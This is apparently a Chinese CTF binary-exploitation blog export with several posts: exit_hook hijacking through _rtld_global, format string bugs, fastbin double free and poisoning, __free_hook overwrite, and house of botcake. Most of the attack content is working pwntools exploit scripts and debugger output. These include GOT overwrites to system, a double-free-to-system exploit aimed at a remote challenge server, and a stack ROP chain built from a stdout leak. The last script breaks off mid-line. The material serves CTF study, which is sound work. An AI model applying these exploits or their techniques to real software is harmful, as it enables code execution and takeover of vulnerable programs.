0x7ffff7fe1043 &lt;_dl_fini+739&gt;    jmp    _dl_fini+366                &lt;_dl_fini+366&gt;    ↓   0x7ffff7fe0ece &lt;_dl_fini+366&gt;    xor    edx, edx   0x7ffff7fe0ed0 &lt;_dl_fini+368&gt;    mov    ecx, 1   0x7ffff7fe0ed5 &lt;_dl_fini+373&gt;    call   _dl_sort_maps                &lt;_dl_sort_maps&gt;  ► 0x7ffff7fe0eda &lt;_dl_fini+378&gt;    lea    rdi, [rip + 0x1ca87]          &lt;_rtld_global+2312&gt;   0x7ffff7fe0ee1 &lt;_dl_fini+385&gt;    call   qword ptr [rip + 0x1d089]     &lt;rtld_lock_default_unlock_recursive&gt;\nvoid_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));    &#125;&#125;\n放一下这两函数的定义\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#else# define __rtld_lock_lock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)# define __rtld_lock_unlock_recursive(NAME) \\  __libc_maybe_call (__pthread_mutex_unlock, (&amp;(NAME).mutex), 0)#endif\ngdb输入p _rtld_global可以看到结构体_rtld_global\n_dl_rtld_lock_recursive = 0x7ffff7fd0150 &lt;rtld_lock_default_lock_recursive&gt;,_dl_rtld_unlock_recursive = 0x7ffff7fd0160 &lt;rtld_lock_default_unlock_recursive&gt;,\n这俩函数是结构体_rtld_global的一部分 存在于_dl_load_lock 里，是 _rtld_global._dl_load_lock.mutex.__size的地址并且在调用之前会把某个地址里的值赋给 rdi。由于__rtld_lock_unlock_recursive存放在结构体空间，为可读可写，那么如果可以修改__rtld_lock_unlock_recursive,就可以在调用exit()时劫持程序流。_rtld_lock_lock_recursive也是一样的流程\n//在libc-2.23中exit_hook = libc_base+0x5f0040+3848exit_hook = libc_base+0x5f0040+3856//在libc-2.27中exit_hook = libc_base+0x619060+3840exit_hook = libc_base+0x619060+3848//libc-2.31exit_hook = libc_base + 0x222060 + 3848\n\n这样一来，只要知道libc版本和任意地址的写，我们可以直接写这个指针，执行exit后就可以劫持控制流了。\n任意一个改写成one_gadget都可以拿到shell\n或将任意一个改为system，将_rtld_global._dl_load_lock.mutex.__size改为&#x2F;bin&#x2F;sh\\x00也可\n","categories":["heap"],"tags":["hook"]},{"title":"disappear","url":"/2024/07/18/disappear/","content":"五月后断更了一个多月，都在干嘛？\n广东省赛2024\n从初赛开始就抽象的比赛，群里的和赛事安排的抽象就不谈了\n","tags":["发电"]},{"title":"格式化字符串漏洞","url":"/2023/08/01/fmt/","content":"在你的内存刻上奇怪的符号\n函数原型printf (“格式化字符串”,参量… )函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。参量表中参数的个数是不定的（如何实现参数的个数不定，可以参考《程序员的自我修养》这本书），可以是一个，可以是两个，三个…，也可以没有参数。printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。但是有个不常见的格式化字符串 %n ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。\n除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。 注意是对应参数（这个参数是指针）的对应的地址开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，每个参数对应的字节数是不同的。接下来写个程序看看\n//gcc -no-pie test.c -fno-stack-protector  -z execstack -o test#include &lt;stdio.h&gt;int d = 1;   //fmt1char x[] =&quot;/bin/sh&quot;int main()&#123;  int n=0;  printf(&quot;aaaaa%n\\n&quot;,&amp;n);  printf(&quot;%d\\n&quot;,n);\t\t  \t  int a=114;  printf(&quot;%d\\n&quot;,a);    char b[]=&quot;str1k3&quot;;  printf(b);  printf(&quot;\\n&quot;);    char c[256];  read(0,c,0x64);  //fmt  printf(c);  puts(x);    //fmt2  if(d==0)  &#123;   backdoor();  &#125;  return 0;&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125;\n\nStarting program: /home/str1k3/Desktop/test aaaaa5114str1k3aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0xa-(nil)-(nil)-0xa-0x7c-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-0x401090-0x336b3172747320[Inferior 1 (process 14255) exited normally]\n如果我们只传入了格式化字符串而没有传入参数\n那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)\n这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束\npwntools已集成格式化字符串漏洞攻击方式\nfrom pwn import *p = process(&#x27;./test&#x27;)elf =ELF(&#x27;./test&#x27;)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)def fmt1():  p.recv()  payload=fmtstr_payload(6,&#123;0x404048:0&#125;)    #把d改为0  p.sendline(payload)  p.interactive()def fmt2():  p.recv()  payload=fmtstr_payload(6,&#123;elf.got[&#x27;puts&#x27;]:elf.plt[&#x27;system&#x27;]&#125;) #把read改为system，执行/bin/sh  p.sendline(payload)  p.interactive()#fmt1()fmt2()\n下面放一道综合一点的题[SWPUCTF 2021 新生赛]NSS_printer_Ichecksec\n[*] &#x27;/home/str1k3/.cache/vmware/drag_and_drop/3CJjqN/NSS_printer&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[104]; // [rsp+0h] [rbp-70h] BYREF  unsigned __int64 v4; // [rsp+68h] [rbp-8h]  v4 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    puts(&quot;======================================&quot;);    puts(&quot;=====welcone to use NSS printer!======&quot;);    printf(&quot;input what you want to say: &quot;);    read(0, buf, 0x64uLL);    printf(&quot;you said:&quot;);    printf(buf);  &#125;&#125;\n\n保护全开。存在格式化字符串漏洞，考虑内存任意写改got表。开了pie，可利用地址相对位置不变，地址后三位不变的特性绕过。最终想法是把printf改成system，然后通过手动输入&#x2F;bin&#x2F;sh来拿到shell\n用上文的测试方式：aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p可调试得：偏移：611（_start）+ 6 &#x3D; 17   #有些师傅用的这个来算基址13（canary）+ 6（偏移） &#x3D; 19（真实地址）15（__libc_start_main）+6（偏移） &#x3D; 21（真实地址）19（main）+6（偏移） &#x3D; 25（真实地址）\nfrom LibcSearcher import *from pwn import*context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./NSS_printer&#x27;)#p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28831)elf = ELF(&#x27;./NSS_printer&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload1 = &quot;%19$p..%21$p-%25$p&quot;p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload1)p.recvuntil(&#x27;you said:&#x27;)canary = int(p.recv(18),16)print(&#x27;canary_addr&#x27;,hex(canary))p.recvuntil(&#x27;..&#x27;)libc_start_main = int(p.recv(14),16)-240print(&#x27;libc_start_main&#x27;,hex(libc_start_main))p.recvuntil(&#x27;-&#x27;)elf_base = int(p.recv(14),16)-0xA14  #main函数的偏移printf_addr = elf_base+elf.got[&#x27;printf&#x27;]print(&#x27;elf_base&#x27;,hex(elf_base))print(&#x27;printf_addr&#x27;,hex(printf_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)libc_base = libc_start_main - libc.dump(&quot;__libc_start_main&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)bin_addr =  libc_base + libc.dump(&quot;str_bin_sh&quot;)print(&#x27;libc_start_main:&#x27;,hex(libc_start_main))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))payload = fmtstr_payload(6,&#123;printf_addr:system_addr&#125;,write_size=&#x27;short&#x27;)print(len(payload))p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload)p.sendline(b&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n\n\n","categories":["stack"],"tags":["fmt"]},{"title":"fastbin_attack","url":"/2023/09/01/fastbin-attack/","content":"fastbinfast_bin的范围:64位机器下属于fast_bin的chunk大小在0x20 – 0x80之间，每个bin链表之间以0x10字节递增，共计7条bin链；32位机器下为0x10 – 0x40，每个bin链表之间以0x8字节递增，共计7条。注意，上面的大小均是包含了chunk头的.\n每个bin是一个单链表，先进后出，所以在fast bin中只有fd指针会被使用。\nfastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1(不会unlink)\n存放fastbin链表的是malloc_state结构体\nstruct malloc_state&#123;  /* Serialize access.  */  __libc_lock_define (, mutex);  /* Flags (formerly in max_fast).  */  int flags;  /* Set if the fastbin chunks contain recently inserted free blocks.  */  /* Note this is a bool but not all targets support atomics on booleans.  */  int have_fastchunks;  /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];  /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];  /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];  /* Linked list */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* Memory allocated from the system in this arena.  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;\ndouble_freeglibc对于fastbin的double_free检查是依靠于检测main_arena指向的chunk即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程\nif (SINGLE_THREAD_P)      &#123;\t/* Check that the top of the bin is not the record we are going to\t   add (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\t*fb = p;      &#125;\n\n\ndebug()add(0x68,b&#x27;aaaa&#x27;)#chunk0add(0x68,b&#x27;aaaa&#x27;)#chunk1add(0x68,b&#x27;aaaa&#x27;)#chunk2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)pause()delete(0)#free chunk0delete(1)#free掉chunk1来干扰链表结构delete(0)#double free chunk0\n\nfree chunk0:\npwndbg&gt; bintcachebins0x70 [  7]: 0x177a650 —▸ 0x177a5e0 —▸ 0x177a570 —▸ 0x177a500 —▸ 0x177a490 —▸ 0x177a420 —▸ 0x177a3b0 ◂— 0x0fastbins0x70: 0x177a250 ◂— 0x0Free chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00\n\nfree chunk1:\nFree chunk (fastbins) | PREV_INUSEAddr: 0x177a250Size: 0x71fd: 0x00Free chunk (fastbins) | PREV_INUSEAddr: 0x177a2c0Size: 0x71fd: 0x177a250fastbins0x70: 0x177a2c0 —▸ 0x177a250 ◂— 0x0\n\ndouble free chunk0\nfastbins0x70: 0x177a2c0 —▸ 0x177a250 ◂— 0x177a2c0\n可以看到此时chunk0既位于链表头也位于链表尾\n如果我们再次申请一个0x68大小的chunk0 申请到的是位于链表头的chunk 但是此时还有一个chunk0在链表中\n那么打印出该堆块便可做到泄露heap_base\n在libc2.23下，还有一个常见的攻击手法malloc_hook，之后再写\nchunk_extend\n//gcc fastbin_chunk_extend.c -g -no-pie -o fastbin_chunk_extend#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    void *chunk0, *chunk2;\tchunk0 = malloc(0x10);//0x10的chunk0\tmalloc(0x10);//0x10的chunk1\t\t*(unsigned long *)((unsigned long)chunk0 - 0x8) = 0x41;// edit chunk0的size域\tfree(chunk0);\t\tchunk2 = malloc(0x30);//0x30的chunk2 实现extend，用chunk2控制了chunk1的内容\t\t    return 0;&#125;\n\n未修改前的chunk0和chunk1\npwndbg&gt; x/20gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000210x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x00000000000000210x4052c0:\t0x0000000000000000\t0x0000000000000000\n稍后申请的chunk2，拿捏了chunk1\npwndbg&gt; x/40gx 0x4052900x405290:\t0x0000000000000000\t0x00000000000000410x4052a0:\t0x0000000000000000\t0x00000000000000000x4052b0:\t0x0000000000000000\t0x0000000000000021#chunk1，但是在chunk2里0x4052c0:\t0x0000000000000000\t0x00000000000000000x4052d0:\t0x0000000000000000\t0x0000000000020d310x4052e0:\t0x0000000000000000\t0x00000000000000000x4052f0:\t0x0000000000000000\t0x00000000000000000x405300:\t0x0000000000000000\t0x00000000000000000x405310:\t0x0000000000000000\t0x00000000000000000x405320:\t0x0000000000000000\t0x00000000000000000x405330:\t0x0000000000000000\t0x00000000000000000x405340:\t0x0000000000000000\t0x00000000000000000x405350:\t0x0000000000000000\t0x00000000000000000x405360:\t0x0000000000000000\t0x00000000000000000x405370:\t0x0000000000000000\t0x00000000000000000x405380:\t0x0000000000000000\t0x00000000000000000x405390:\t0x0000000000000000\t0x00000000000000000x4053a0:\t0x0000000000000000\t0x00000000000000000x4053b0:\t0x0000000000000000\t0x00000000000000000x4053c0:\t0x0000000000000000\t0x0000000000000000\n\nfastbin_poisoning跟tcachebin的类似\n//gcc fastbin_poisoning.c -g -no-pie -o fastbin_poisoning#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;\t\tunsigned long fck[4];   printf(&quot;stack addr is %p\\n&quot;, fck);   unsigned long *ptr = malloc(0x10);   free(ptr);   fck[1] = 0x21;           // same with 0x20   ptr[0] = (unsigned long)fck; // edit fd pointer   printf(&quot;the original heap %p\\n&quot;, malloc(0x10));   printf(&quot;alloc to the stack %p\\n&quot;, malloc(0x10));    return 0;&#125;\nAllocated chunk | PREV_INUSEAddr: 0x602310Size: 0x21Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0Free chunk (fastbins) | PREV_INUSEAddr: 0x602310Size: 0x21fd: 0x7fffffffe2d0\n这里写入的是栈上的地址，也可以考虑写入bss段或者libc段，要看具体的利用手法\n该攻击方式也是malloc_hook攻击的前置手段\n前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"free_hook","url":"/2023/09/14/free-hook/","content":"free_hook的调用\nvoid (*hook) (void *, const void *)= atomic_forced_read (__free_hook);if (__builtin_expect (hook != NULL, 0))&#123;(*hook)(mem, RETURN_ADDRESS (0));return;&#125;\n对应的汇编代码\n.text:00000000000736F4                 sub     rsp, 8          ; Alternative name is &#x27;cfree&#x27;.text:00000000000736F8                 mov     rax, cs:__free_hook_ptr.text:00000000000736FF                 mov     rax, [rax].text:0000000000073702                 test    rax, rax.text:0000000000073705                 jz      short loc_73710.text:0000000000073707                 mov     rsi, [rsp+8].text:000000000007370C                 call    rax\nfree_hook的存储的位置,在 free_hook上方 -0xb58 我们可以找到满足top_chunk要求的大小libc-2.27.so\npwndbg&gt; p &amp;__free_hook$2 = (void (**)(void *, const void *)) 0x7ffff7dcf8e8 &lt;__free_hook&gt;pwndbg&gt; x/8gx 0x7ffff7dcf8e8 - 0xb580x7ffff7dced90 &lt;initial+16&gt;:\t0x0000000000000004\t0x05fc5621ed6fad690x7ffff7dceda0 &lt;initial+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedb0 &lt;initial+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcedc0 &lt;initial+64&gt;:\t0x0000000000000000\t0x0000000000000000\n伪造的fastbin的addr为0x7ffff7dced90当程序可以在该位置申请chunk的时候，通过重复向top_chunk申请最终覆写__free_hook的值为system的值通过free &#x2F;bin&#x2F;sh\\x00的chunk,达到程序流劫持getshell。\n修改global_max_fast通过fastbin attack 使得可以申请指定大小的，包含free_hook的chunk，比如利用0x7ffff7dced98处的值，但是这里要合理去构造偏移\npwndbg&gt; x/50gx 0x7ffff7dcf8e8-0xC000x7ffff7dcece8 &lt;lock.10026+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcecf8 &lt;maxmap&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced08 &lt;string_space_max&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced18 &lt;lock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced28:\t0x0000000000000000\t0x00000000000000000x7ffff7dced38 &lt;lock+8&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced48 &lt;phys_pages.8062&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced58 &lt;last_environ&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced68 &lt;envlock&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dced78:\t0x0000000000000000\t0x00000000000000000x7ffff7dced88 &lt;initial+8&gt;:\t0x0000000000000001\t0x00000000000000040x7ffff7dced98 &lt;initial+24&gt;:\t0x05fc5621ed6fad69\t0x0000000000000000......\n\n看个例题8~ciscn_2019_en_3\n[*] &#x27;~/ciscn_2019_en_3&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled```\n程序只实现了add和deletemain函数里的_printf_chk能泄露libc地址\nputs(&quot;What&#x27;s your name?&quot;);read(0, buf, 0x20uLL);_printf_chk(1LL, buf);puts(&quot;Please input your ID.&quot;);read(0, s, 8uLL);puts(s);\n_printf_chk有两个参数，第一个参数0x1代表保护级别存入寄存器rdi，第二个参数才是我们输入的格式化利用字符串%p-%p-%p存入寄存器rsi。动调发现寄存器rcx存放的是read+17的地址根据64位linux下前6个寄存器传参的习惯（rdi&#x2F;rsi&#x2F;rdx&#x2F;rcx&#x2F;r8&#x2F;r9）此处已经用了两个寄存器。所以第二个%p将会打印出rcx存放的值。\nRCX  0x7ffff7af2031 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */RDX  0x20RDI  0x1RSI  0x7fffffffe2a0 ◂— 0xa61616161 /* &#x27;aaaa\\n&#x27; */R8   0x11R9   0x7ffff7fe1500 ◂— 0x7ffff7fe1500\nadd\nunsigned __int64 sub_BE9()&#123;  int v0; // ebx  int v2; // [rsp+4h] [rbp-1Ch] BYREF  unsigned __int64 v3; // [rsp+8h] [rbp-18h]  v3 = __readfsqword(0x28u);  if ( dword_20204C &gt; 16 )    puts(&quot;Enough!&quot;);  puts(&quot;Please input the size of story: &quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v2);  *((_DWORD *)&amp;unk_202060 + 4 * dword_20204C) = v2;  v0 = dword_20204C;  *((_QWORD *)&amp;unk_202068 + 2 * v0) = malloc(v2);  puts(&quot;please inpute the story: &quot;);  read(0, *((void **)&amp;unk_202068 + 2 * dword_20204C), v2);  ++dword_20204C;  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v3;&#125;\ndelete存在UAF\nunsigned __int64 sub_D32()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;Please input the index:&quot;);  _isoc99_scanf(&quot;%d&quot;, &amp;v1);  free(*((void **)&amp;unk_202068 + 2 * v1));  puts(&quot;Done!&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\n打one_gadget没穿\n└─$ one_gadget libc-2.27.so0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  rsp &amp; 0xf == 0  rcx == NULL0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)constraints:  [rsp+0x40] == NULL0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL\n最后打的是将free_hook改为system，第二个堆块写’&#x2F;bin&#x2F;sh\\x00’\n[+] read        : 0x7f8e125b6070[+] libc_base   : 0x7f8e124a6000[+] sys_addr    : 0x7f8e124f5440[+] one_gadget  : 0xff1c2499b322[+] malloc_hook : 0x7f8e12891c30[+] free_hook   : 0x7f8e128938e8\nexp:\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)libc = ELF(&#x27;libc-2.27.so&#x27;)elf = ELF(&#x27;./ciscn_2019_en_3&#x27;)#p = process(&#x27;./ciscn_2019_en_3&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29868)def add(size,buf):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(1))\tp.recvuntil(&quot;Please input the size of story: \\n&quot;)\tp.sendline(str(size))\tp.recvuntil(&quot;please inpute the story: \\n&quot;)\tp.sendline(buf)def free(idx):\tp.recvuntil(&quot;Input your choice:&quot;)\tp.sendline(str(4))\tp.recvuntil(&quot;Please input the index:\\n&quot;)\tp.sendline(str(idx))one_gadget = 0x4f322p.recvuntil(&quot;What&#x27;s your name?\\n&quot;)p.sendline(b&quot;%p-%p-%p&quot;)p.recvuntil(&quot;-&quot;)info = p.recvuntil(&quot;-&quot;, drop=True)info = int(info.decode(&quot;ISO-8859-1&quot;), 16)-17read = libc.sym[&quot;read&quot;]libc_base = info-readsys_addr = libc_base + libc.sym[&#x27;system&#x27;]one_gadget = libc_base + 0x4f322malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + one_gadgetp.recvuntil(&quot;Please input your ID.\\n&quot;)p.send(&quot;a&quot;)# alloc to libcadd(0x20, &quot;a&quot;)  # 0free(0)free(0)#double_free chunk0add(0x20, p64(free_hook))   # 1add(0x20, &quot;/bin/sh\\x00&quot;) # 2add(0x20, p64(sys_addr))#pause()free(1)#gdb.attach(p)success(&quot;read        : &quot; + hex(info))success(&quot;libc_base   : &quot; + hex(libc_base))success(&quot;sys_addr    : &quot; + hex(sys_addr))success(&quot;one_gadget  : &quot; + hex(one_gadget))success(&quot;malloc_hook : &quot; + hex(malloc_hook))success(&quot;free_hook   : &quot; + hex(free_hook))p.interactive()","categories":["heap"],"tags":["hook"]},{"title":"house_of_botcake","url":"/2023/11/11/house-of-botcake/","content":"glibc高版本2.27之后，简单的tcache bin double free不能实现因为引入了对tcache key的检查如下：\nsize_t tc_idx = csize2tidx (size);if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)  &#123;/* Check to see if it&#x27;s already in the tcache.  */tcache_entry *e = (tcache_entry *) chunk2mem (p);&#125;/* This test succeeds on double free.  However, we don&#x27;t 100%   trust it (it also matches random payload data at a 1 in   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely   coincidence before aborting.  */if (__glibc_unlikely (e-&gt;key == tcache))  &#123;tcache_entry *tmp;LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)  if (tmp == e)malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);/* If we get here, it was a coincidence.  We&#x27;ve wasted a   few cycles, but don&#x27;t abort.  */  &#125;\n当 free 掉一个堆块进入 tcache 时假如堆块的 bk 位存放的 key &#x3D;&#x3D; tcache_key就会遍历这个大小的 Tcache，假如发现同地址的堆块，则触发 Double Free 报错。\n以下程序来自how2heap\n//gcc botcake.c -g  -o botcake //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    setbuf(stdin, NULL);    setbuf(stdout, NULL);//不让_IO_FILE干涉我们的堆块    // prepare the target    intptr_t stack_var[4];    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;//准备塞满tcache    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);//prev    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);//victim    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);       malloc(0x10);//防止合并     for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;//填满tcache    free(a);//victim 2 unsortedbin        free(prev);//free掉prev 使其与victim合并        //申请出一个堆块，此时会优先从 Tcache 中取出一个填充堆块腾出位置。然后再 Free 掉 victim ，victim 进入 Tcache，完成 Double Free    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/    //此时造成堆重叠，一个大的unsortedbin包含一个小的tcachebin    //申请一个比victim大的堆块，可以篡改victim的fwd（next）指针    intptr_t *b = malloc(0x120);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        //值得注意的是，一次篡改过后，我们可以free掉victim和执行篡改的堆块，再次申请执行篡改的堆块即可再次篡改victim的next指针，多次进行Tcache Poinsoning    return 0;&#125;\n运行结果实际使用看例题\n[CISCN 2022 华东北]blue一键四连check,每次进menu前都会检查malloc_hook free_hook有没有被劫持检查不通过就会调用_exit（不能用exit_hook劫持）add限制size &lt;&#x3D;0x90del是一个正常的delete，无UAFshow仅可以调用一次输入666可以进入仅有一次的UAF\n#prepare house of botcake for i in range(9):    add(0x80, b&#x27;aa&#x27;)add(0x80, b&#x27;aa&#x27;)for i in range(7):    delete(i)magic(8)#show(8)delete(7)add(0x80, b&#x27;aa&#x27;) #0delete(8)#unsortedbin 合并add(0x70, b&#x27;bb&#x27;) #1  分割unsortedbin\n准备house_of_botcake（此处忽略leak_libc_base）\nstdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]p1 = p64(0) + p64(0x91) + p64(stdout) #hijack stdoutadd(0x70, p1) # 2 overlappingadd(0x80, b&#x27;cc&#x27;) # 3\n利用堆重叠，将堆块分配到stdout处，此时的堆结构，三个堆块叠叠乐\nenviron = libc_base + libc.sym[&#x27;environ&#x27;]p2 = p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2 #stdout -&gt; environ leak stack_addradd(0x80, p2)   #4stack_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x128#add返回的地址\n借助stdout泄露environ中的栈地址，以此获得add的ret地址这两步实际上是覆写了stdout中的flags标志（绕过检查），以及将write_base和write_ptr &amp; write_end改成environ和environ + 8\ndelete(3)delete(2)p3 = p64(0) + p64(0x91) + p64(stack_addr) #再次任意申请申请到栈上add(0x70, p3)#2add(0x80, &#x27;dd&#x27;) #3\n再打一次tcache poisoning，把下一个堆块分配到栈上\np4 = b&#x27;./flag\\x00\\x00&#x27;# open(&#x27;./flag&#x27;, 0)p4 += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr)# read(3, stack_addr + 0x200, 0x50)p4 += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(stack_addr + 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(read_addr)# puts(stack_addr + 0x200)p4 += p64(pop_rdi_ret) + p64(stack_addr + 0x200) + p64(puts_addr)add(0x80, p4)#ret2stack（确实）\n在栈上布置orw的ropchain，由于add的ret地址已经遭到篡改，ret的时候会直接跳到栈上执行ropchain本地打通：\nfrom pwn import*from pwn import p64,u64#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28672)p = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = 